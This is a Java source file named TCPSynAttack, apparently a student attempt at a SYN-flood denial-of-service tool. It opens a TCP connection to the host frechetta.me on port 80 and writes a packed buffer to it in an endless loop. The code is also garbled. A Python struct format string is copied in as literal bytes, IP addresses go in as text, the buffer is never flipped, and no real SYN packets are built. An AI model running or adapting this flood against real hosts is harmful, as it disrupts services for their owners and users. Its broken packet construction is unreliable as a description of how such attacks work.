import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.InputStreamReader;
import java.lang.Exception;
import java.io.IOException;
import java.nio.ByteBuffer;
import java.net.Socket;
import java.util.*;

public class TCPSynAttack {

	

	public static void main(String[] args)
	{
		boolean timeToExit = true;

		String characters = "!BBHHHBBH4s4s";
		byte[] charactersBytes = characters.getBytes();
		int ip_ihl = 5;
		int ip_ver = 4;
		int ip_tos = 0;
		int ip_tot_len = 0;
		int ip_id = 54321;
		int ip_frag_off = 0;
		int ip_ttl = 255;
		int ip_proto = 6;
		int ip_check = 0;
		String source_ip = "10.1.12.66";
		String destination_ip = "10.1.12.173";
		byte[] source_ipBytes = source_ip.getBytes();
		byte[] destination_ipBytes = destination_ip.getBytes();

		int ip_ihl_ver = (ip_ver << 4) + ip_ihl;

		Socket socket = null;

		try{
			socket = new Socket("frechetta.me", 80); 	
		} catch(Exception e){
			System.out.println("Connection FAILED!!! Failed to open connection to a socket.");
      		System.exit(0);
		}
		System.out.println("Success");
		
		ByteBuffer buf = ByteBuffer.allocate(1024);

		buf.put(charactersBytes);
		buf.putInt(ip_ihl_ver);
		buf.putInt(ip_tos);
		buf.putInt(ip_tot_len);
		buf.putInt(ip_id);
		buf.putInt(ip_frag_off);
		buf.putInt(ip_ttl);
		buf.putInt(ip_proto);
		buf.putInt(ip_check);
		buf.put(source_ipBytes);
		buf.put(destination_ipBytes);

		int size = buf.remaining();
		byte[] arr = new byte[buf.remaining()];
		buf.get(arr);
		
		System.out.println("Size: " + size);

		long startTime = System.currentTimeMillis();
		System.out.println("startTime: " + startTime);

		int sent = 0;

		while(true){
			long endTime = System.currentTimeMillis();
			if(endTime - startTime < 60){
				try(DataOutputStream sendToServer = new DataOutputStream(socket.getOutputStream()))
		        {
		        	while(timeToExit != false) {
		        	sendToServer.write(arr, 0, size);
		        	sent++;
		        	System.out.println("Packt got sent");
		        }
		        }
		        catch(IOException ex)
		        {
		            System.out.println("Cannot send packet");
		            System.exit(0);
		        }
		    }
		    else{
		    	System.exit(0);
		    }
		}
	}



}